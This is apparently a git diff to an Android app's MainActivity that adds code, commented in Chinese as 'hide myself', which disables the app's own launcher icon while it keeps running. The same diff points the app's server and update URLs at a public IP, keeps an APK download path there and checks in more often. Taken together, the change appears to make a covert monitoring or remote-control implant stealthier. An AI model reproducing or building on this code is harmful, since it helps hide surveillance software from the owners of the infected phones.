@@ -5,6 +5,7 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.Menu;
@@ -23,17 +24,23 @@ public class MainActivity extends Activity {
 		// runService();
 
 		Log.i(TAG, "程序开始运行");
+		
+		//隐藏自己
+		PackageManager p = getPackageManager();  
+        p.setComponentEnabledSetting(getComponentName(),  
+        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,  
+        PackageManager.DONT_KILL_APP); 
 
 		SharedPreferences sharedPreferences = getSharedPreferences("setting",
 				MODE_PRIVATE);
 		Editor editor = sharedPreferences.edit();// 获取编辑器
-		editor.putString("SERVER_URL", "http://192.168.192.184");
+		editor.putString("SERVER_URL", "http://58.64.194.214:8080");
 		editor.putString("APK_PATH",
 				"http://58.64.194.214:8080/Content/android.apk");
-		editor.putString("UPDATE_SERVER", "http://192.168.192.184");
+		editor.putString("UPDATE_SERVER", "http://58.64.194.214:8080");
 		editor.putString("UPDATE_VERJSON", "ver.json");
 		editor.putInt("POST_INTERVAL", 60 * 1000);
-		editor.putInt("CHECKAPP_INTERVAL", 10 * 1000);
+		editor.putInt("CHECKAPP_INTERVAL", 2 * 1000);
 		editor.commit();// 提交修改
 
 		AlarmManagerUtil.sendUpdateBroadcast(this.getApplicationContext());
